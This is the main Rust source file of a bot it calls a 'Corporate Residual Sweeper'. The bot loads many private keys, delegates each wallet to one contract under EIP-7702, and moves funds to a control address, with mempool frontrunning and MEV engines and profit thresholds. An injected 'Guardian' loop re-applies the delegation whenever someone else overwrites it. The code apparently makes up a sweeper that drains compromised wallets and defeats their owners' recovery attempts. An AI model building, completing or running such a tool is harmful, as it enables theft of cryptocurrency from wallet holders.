mod benchmark;
mod cache;
mod config;
mod contract;
mod dashboard;
mod extractor;
mod frontrun;
mod mev;
mod monitor;
mod queue;
mod rpc;
mod storage;
mod wallets;

use benchmark::maybe_run_network_benchmark;
use cache::RuntimeCache;
use config::Config;
use dashboard::DashboardHandle;
use rpc::RpcFleet;
use std::sync::Arc;
use storage::Storage;
use tracing::{error, info};
use wallets::load_wallets;

// ============================================================
// GUARDIAN - Monitor de Delegação EIP-7702
// ============================================================
use ethers::prelude::*;
use std::time::Duration;

async fn start_delegation_guardian(
    rpc_fleet: Arc<RpcFleet>,
    config: Arc<Config>,
    wallet_address: Address,
) -> Result<(), Box<dyn std::error::Error>> {
    let our_contract = config.contract;
    let wallet_addr = wallet_address;

    info!("🛡️ Guardian iniciado para {:?}", wallet_addr);
    info!("   Contrato protegido: {:?}", our_contract);

    let endpoint = rpc_fleet.read_endpoint();
    let provider = endpoint.provider.clone();

    let mut last_nonce = provider
        .get_transaction_count(wallet_addr, None)
        .await?
        .as_u64();

    loop {
        tokio::time::sleep(Duration::from_millis(500)).await;

        let current_nonce = match provider.get_transaction_count(wallet_addr, None).await {
            Ok(nonce) => nonce.as_u64(),
            Err(e) => {
                error!("Guardian: falha ao ler nonce: {}", e);
                continue;
            }
        };

        let code = match provider.get_code(wallet_addr, None).await {
            Ok(code) => code,
            Err(e) => {
                error!("Guardian: falha ao ler código: {}", e);
                continue;
            }
        };

        // Verifica se a delegação ainda é nossa
        let is_our_delegation =
            if code.len() >= 23 && code.as_ref().starts_with(&[0xef, 0x01, 0x00]) {
                let delegated = Address::from_slice(&code.as_ref()[3..23]);
                delegated == our_contract
            } else {
                false
            };

        if current_nonce != last_nonce {
            info!(
                "⚠️ Guardian: nonce mudou {} -> {}",
                last_nonce, current_nonce
            );

            if !is_our_delegation {
                error!("🚨 GUARDIAN: Delegação sobrescrita!");
                error!("   Reaplicando com nonce {}...", current_nonce + 1);

                // Usa o sponsor wallet do config
                let sponsor_key = &config.sender_private_key;
                let rpc_url = rpc_fleet.send_endpoint().url;

                let status = std::process::Command::new("cargo")
                    .args(&[
                        "run",
                        "--bin",
                        "predelegate_7702",
                        "--",
                        "--wallets",
                        config.wallets.to_str().unwrap_or("keys.txt"),
                        "--rpc-url",
                        &rpc_url,
                        "--chain-id",
                        &config.chain_id.to_string(),
                        "--delegate-contract",
                        &format!("{:?}", our_contract),
                        "--sponsor-private-key",
                        sponsor_key,
                        "--target-nonce",
                        &(current_nonce + 1).to_string(),
                    ])
                    .status();

                match status {
                    Ok(s) if s.success() => info!("✅ Guardian: delegação reaplicada!"),
                    Ok(_) => error!("❌ Guardian: falha ao reaplicar!"),
                    Err(e) => error!("❌ Guardian: erro ao executar: {}", e),
                }
            }
        }

        last_nonce = current_nonce;
    }
}
// ============================================================

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    tracing_subscriber::fmt()
        .with_target(false)
        .with_thread_ids(true)
        .init();

    info!("Corporate Residual Sweeper");
    info!("Contract path: Simple7702Delegate (EIP-7702)");

    let config = Arc::new(Config::load()?);
    let rpc_fleet = Arc::new(RpcFleet::from_config(&config)?);
    let runtime_cache = Arc::new(RuntimeCache::new(&config));
    let storage = Storage::new(&config.storage_path)?;
    let loaded_wallets = load_wallets(&config.wallets, config.chain_id)?;
    let total_read = loaded_wallets.total_read;
    let duplicate_keys = loaded_wallets.duplicates;
    let invalid_keys = loaded_wallets.invalid;
    let unique_wallets = loaded_wallets.unique;
    let wallets = loaded_wallets.wallets;

    info!("Wallet source: {}", config.wallets.display());
    info!("Keys read: {}", total_read);
    info!("Unique wallets: {}", unique_wallets);
    info!("Duplicate keys ignored: {}", duplicate_keys);
    info!("Invalid keys ignored: {}", invalid_keys);
    info!("Contract target: {:?}", config.contract);
    info!("Operational destination: {:?}", config.control_address);
    info!("Network: {}", config.network);
    info!("Chain id: {}", config.chain_id);
    info!("Bot mode: {}", config.bot_mode.as_str());
    info!("Allow send: {}", config.allow_send);
    info!(
        "Public fallback: {}",
        if config.disable_public_fallback {
            "disabled"
        } else {
            "enabled"
        }
    );
    info!("Mock contract mode: {}", config.mock_contract_mode);
    info!("Mock hot wallet count: {}", config.mock_hot_wallet_count);
    info!("Mock hot balance: {} ETH", config.mock_hot_balance_eth);
    info!(
        "Mock hot wallet mode: {}",
        config.mock_hot_wallet_mode.as_str()
    );
    info!("Mock hot wallet rounds: {}", config.mock_hot_wallet_rounds);
    info!(
        "Paper allowlist size: {}",
        config.test_wallet_allowlist.len()
    );
    if let Some(max_value) = config.max_sweep_value_eth {
        info!("Max sweep value: {} ETH", max_value);
    }
    info!("Min balance: {} ETH", config.min_balance);
    info!("Min net profit: {} ETH", config.min_net_profit_eth);
    info!("Min ROI: {} bps", config.min_roi_bps);
    info!("Native immediate sweep: {}", config.native_immediate_sweep);
    info!("External gas sponsor: {}", config.use_external_gas_sponsor);
    info!(
        "Asset policy native/stable/other: {}/{}/{}",
        config.native_policy.enabled,
        config.stable_policy.enabled,
        config.other_token_policy.enabled
    );
    info!("Scan interval: {} ms", config.interval);
    info!(
        "Adaptive scan interval: {}-{} ms",
        config.min_scan_interval_ms, config.max_scan_interval_ms
    );
    info!("Scan concurrency: {}", config.scan_concurrency);
    info!("Batch scan size: {}", config.batch_scan_size);
    info!("Queue workers: {}", config.queue_workers);
    info!("Hot-path info events: {}", config.hot_path_info_events);
    info!("Wallet cooldown: {} s", config.wallet_cooldown_secs);
    info!("Queue dedupe: {} s", config.queue_dedupe_secs);
    info!(
        "Wallet failure backoff: base {} s max {} s",
        config.wallet_failure_backoff_base_secs, config.wallet_failure_backoff_max_secs
    );
    info!("RPC stale threshold: {} s", config.rpc_stale_threshold_secs);
    info!(
        "RPC rate-limit cooldown: {} s",
        config.rpc_rate_limit_cooldown_secs
    );
    info!("Max Infura endpoints: {}", config.max_infura_endpoints);
    info!(
        "RPC preference read/send: {}/{}",
        config.rpc_read_preference.as_str(),
        config.rpc_send_preference.as_str()
    );
    info!("Contract cache TTL: {} s", config.contract_cache_ttl_secs);
    info!("Gas price cache TTL: {} s", config.gas_price_cache_ttl_secs);
    info!("Storage: {}", config.storage_path.display());
    info!("RPC endpoints configured: {}", rpc_fleet.endpoint_count());
    info!("Dashboard: http://{}", config.dashboard_addr);
    info!("Mempool monitor: {}", config.enable_mempool_monitor);
    info!("MEV engine: {}", config.mev.enabled);

    if maybe_run_network_benchmark(config.clone(), rpc_fleet.clone(), &wallets).await? {
        return Ok(());
    }

    let dashboard = DashboardHandle::new(
        &config,
        wallets.len(),
        total_read,
        duplicate_keys,
        invalid_keys,
        storage,
        &rpc_fleet,
    );
    let dashboard_server = dashboard.clone();
    let dashboard_addr = config.dashboard_addr;
    tokio::spawn(async move {
        if let Err(err) = dashboard::run_server(dashboard_server, dashboard_addr).await {
            error!("Dashboard server failed: {}", err);
        }
    });

    let dashboard_rankings = dashboard.clone();
    tokio::spawn(async move {
        loop {
            dashboard_rankings.refresh_residual_rankings();
            tokio::time::sleep(std::time::Duration::from_secs(2)).await;
        }
    });

    let dashboard_flush = dashboard.clone();
    tokio::spawn(async move {
        loop {
            dashboard_flush.flush_storage_buffers();
            tokio::time::sleep(std::time::Duration::from_millis(250)).await;
        }
    });

    let cache_refresher_config = config.clone();
    let cache_refresher_fleet = rpc_fleet.clone();
    let cache_refresher_cache = runtime_cache.clone();
    let cache_refresher_dashboard = dashboard.clone();
    tokio::spawn(async move {
        let refresh_interval_secs = (cache_refresher_config
            .gas_price_cache_ttl_secs
            .min(cache_refresher_config.contract_cache_ttl_secs))
        .max(2);
        loop {
            let endpoint = cache_refresher_fleet.send_endpoint();
            if let Err(err) = cache_refresher_cache
                .refresh_contract_state(
                    endpoint.provider.clone(),
                    cache_refresher_config.contract,
                    &cache_refresher_config.network,
                )
                .await
            {
                cache_refresher_dashboard.event(
                    "warn",
                    format!("background contract cache refresh failed: {}", err),
                );
            }

            if let Err(err) = cache_refresher_cache
                .refresh_gas_price(endpoint.provider.clone(), &cache_refresher_config.network)
                .await
            {
                cache_refresher_dashboard.event(
                    "warn",
                    format!("background gas cache refresh failed: {}", err),
                );
            }

            tokio::time::sleep(std::time::Duration::from_secs(refresh_interval_secs)).await;
        }
    });

    if config.enable_mempool_monitor {
        let frontrun_config = config.clone();
        let frontrun_dashboard = dashboard.clone();
        tokio::spawn(async move {
            if let Err(err) =
                frontrun::start_mempool_monitor(frontrun_config, frontrun_dashboard).await
            {
                error!("Mempool monitor failed: {}", err);
            }
        });
    }

    if config.mev.enabled {
        let mev_config = config.clone();
        let mev_fleet = rpc_fleet.clone();
        let mev_dashboard = dashboard.clone();
        tokio::spawn(async move {
            if let Err(err) = mev::run(mev_config, mev_fleet, mev_dashboard).await {
                error!("MEV engine failed: {}", err);
            }
        });
    }

    // ============================================================
    // INJETANDO O GUARDIAN PARA CADA WALLET
    // ============================================================
    let guardian_config = config.clone();
    let guardian_fleet = rpc_fleet.clone();
    for wallet in &wallets {
        let wallet_addr = wallet.address();
        let cfg = guardian_config.clone();
        let fleet = guardian_fleet.clone();

        tokio::spawn(async move {
            if let Err(e) = start_delegation_guardian(fleet, cfg, wallet_addr).await {
                error!("Guardian falhou para {:?}: {}", wallet_addr, e);
            }
        });
    }
    info!("🛡️ Guardian injectado para {} wallet(s)", wallets.len());
    // ============================================================

    if duplicate_keys > 0 {
        dashboard.event(
            "warn",
            format!(
                "ignored {} duplicate keys from {}",
                duplicate_keys,
                config.wallets.display()
            ),
        );
    }
    if invalid_keys > 0 {
        dashboard.event(
            "warn",
            format!(
                "ignored {} invalid keys from {}",
                invalid_keys,
                config.wallets.display()
            ),
        );
    }

    if let Err(err) =
        monitor::start_monitor(rpc_fleet, runtime_cache, config, wallets, dashboard).await
    {
        error!("Fatal error: {}", err);
    }

    Ok(())
}
